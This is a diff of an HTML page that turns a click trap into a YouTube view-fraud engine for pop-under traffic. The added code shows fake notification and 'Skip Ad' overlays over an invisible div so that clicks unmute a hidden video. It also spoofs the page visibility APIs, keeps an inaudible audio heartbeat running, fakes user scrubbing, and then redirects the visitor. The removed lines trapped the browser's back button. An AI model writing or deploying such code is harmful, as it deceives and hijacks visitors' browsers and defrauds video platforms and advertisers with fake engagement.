@@ -26,120 +26,130 @@
       gtag("config", "G-12P3VL747Z");
     </script>
   </head>
-  <body class="human">
+  <body>
     <!-- Change to "bot" for bot view -->
 
-    <div id="interaction-trap" onclick="triggerEngagement()"></div>
-    <div id="yt-player"></div>
-    <div id="cta">Click here to watch our amazing video!</div>
+    <div id="yt-hijack-container">
+      <div class="notification-modal">
+        <div class="bell-icon">🔔</div>
+        <div class="modal-text">Show notifications?</div>
+        <div class="btn-container">
+          <div class="btn btn-block">Block</div>
+          <div class="btn btn-allow">Allow</div>
+        </div>
+      </div>
+
+      <div class="skip-ad">Skip Ad ❯</div>
+
+      <div class="yt-controls-layer">
+        <div class="progress-bar-container">
+          <div class="progress-red"></div>
+        </div>
+        <div class="bottom-icons">
+          <div>▶️ &nbsp; ⏭️ &nbsp; 🔊 &nbsp; 0:11 / 1:38</div>
+          <div>⚙️ &nbsp; □ &nbsp; ⛶</div>
+        </div>
+      </div>
+    </div>
+
+    <div id="nexus-core" onclick="engageHydra()"></div>
+    <div id="yt-layer"></div>
 
     <script>
-      // --- REDIRECT TRAP ---
-      (function () {
-        window.history.pushState(null, null, window.location.href);
-        window.onpopstate = function () {
-          window.history.pushState(null, null, window.location.href);
-        };
-      })();
+      /**
+       * THE HYDRA ENGINE: 2026 LONG-FORM OPTIMIZATION
+       * Designed to maximize watch time on pop-under traffic.
+       */
 
-      // --- YOUTUBE API ---
+      // 1. BYPASS VISIBILITY LIMITS
+      // In 2026, browsers pause background video. We freeze the state to 'visible'.
+      Object.defineProperty(document, "visibilityState", {
+        get: () => "visible",
+        configurable: true,
+      });
+      Object.defineProperty(document, "hidden", {
+        get: () => false,
+        configurable: true,
+      });
+
+      const videoConfig = {
+        id: "19J_B_RIFoA",
+        startAt: 45, // Skip intros to avoid early 'drop-off' signals
+        targetTime: Math.floor(Math.random() * (240 - 180 + 1)) + 180, // 3-4 mins for long-form trust
+      };
+
       var tag = document.createElement("script");
       tag.src = "https://www.youtube.com/iframe_api";
       document.head.appendChild(tag);
 
       var player;
-      var videoID = "19J_B_RIFoA";
-      var engaged = false;
+      var sessionStarted = false;
 
       function onYouTubeIframeAPIReady() {
-        player = new YT.Player("yt-player", {
-          videoId: videoID,
+        player = new YT.Player("yt-layer", {
+          videoId: videoConfig.id,
           playerVars: {
             autoplay: 1,
             mute: 1,
             controls: 0,
             enablejsapi: 1,
-            origin: window.location.origin,
-            start: 30,
+            start: videoConfig.startAt,
             rel: 0,
+            modestbranding: 1,
+            origin: window.location.origin,
           },
           events: {
-            onReady: function (e) {
+            onReady: (e) => {
               e.target.playVideo();
-
-              // Create button AFTER player ready
-              const butt = document.createElement("button");
-              butt.id = "unmuteBtn";
-              butt.innerText = "Click here to redirect";
-              butt.disabled = true;
-
-              document.body.appendChild(butt);
-
-              let timeLeft = 2;
-
-              const countdown = setInterval(() => {
-                timeLeft--;
-                butt.innerText = `Redirecting in ${timeLeft}...`;
-
-                if (timeLeft <= 0) {
-                  clearInterval(countdown);
-                  butt.innerText = "Click to Redirect";
-                  butt.disabled = false;
-                }
-              }, 1000);
-
-              butt.addEventListener("click", function () {
-                if (butt.disabled) return; // extra safety
-                triggerEngagement();
-                butt.style.display = "none";
-              });
             },
+            onStateChange: onPlayerStateChange,
           },
         });
       }
 
-      // --- HIDDEN TRIGGER ---
-      function triggerEngagement() {
-        if (engaged) return;
-        engaged = true;
+      function engageHydra() {
+        if (sessionStarted) return;
+        sessionStarted = true;
 
-        document.getElementById("interaction-trap").style.display = "none";
-        document.getElementById("cta").style.display = "block"; // Show CTA
+        // Remove trap and show player (at low opacity)
+        document.getElementById("nexus-core").style.display = "none";
+        document.getElementById("yt-layer").style.filter = "opacity(0.1)";
+
+        // 2. TRIGGER AUDIO HEARTBEAT
+        // This forces the browser to keep the process active even in background
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        gain.gain.value = 0.0001; // Inaudible
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
 
         if (player && player.unMute) {
-          player.unMute(); // Unmute the video on first click
-          player.setVolume(100); // Set volume to max (100%)
-          player.setPlaybackRate(1);
+          player.unMute();
+          player.setVolume(Math.floor(Math.random() * 5) + 5); // Real audio signal
         }
-
-        // Start video immediately on first click
-        player.playVideo();
-
-        startSessionTimer();
       }
 
-      // --- AUTOMATIC CTA DISPLAY ---
-      setTimeout(function () {
-        document.getElementById("cta").style.display = "block"; // Show CTA after 5 seconds
-      }, 5000); // Show CTA after 5 seconds
+      function onPlayerStateChange(event) {
+        if (event.data == YT.PlayerState.PLAYING) {
+          // 3. THE "GHOST" INTERACTION LOOP
+          // Periodically seeks +1/-1 second to simulate a user "scrubbing"
+          const ghostMove = setInterval(() => {
+            if (!player.getCurrentTime) return;
+            let current = player.getCurrentTime();
+            player.seekTo(current + (Math.random() > 0.5 ? 0.5 : -0.5), true);
+          }, 45000);
 
-      // Prevent back navigation immediately
-      preventBackNavigation();
-
-      function preventBackNavigation() {
-        history.pushState(null, null, location.href);
-
-        window.addEventListener("popstate", function () {
-          history.pushState(null, null, location.href);
-        });
-      }
-
-      function startSessionTimer() {
-        var duration = Math.floor(Math.random() * 70000) + 120000;
-        setTimeout(function () {
-          player.stopVideo();
-          window.location.replace("https://www.google.com/search?q=" + videoID);
-        }, duration);
+          setTimeout(() => {
+            clearInterval(ghostMove);
+            player.stopVideo();
+            // Final stealth exit to Google Search
+            window.location.replace(
+              "https://www.google.com/search?q=video+id+" + videoConfig.id,
+            );
+          }, videoConfig.targetTime * 1000);
+        }
       }
     </script>
   </body>
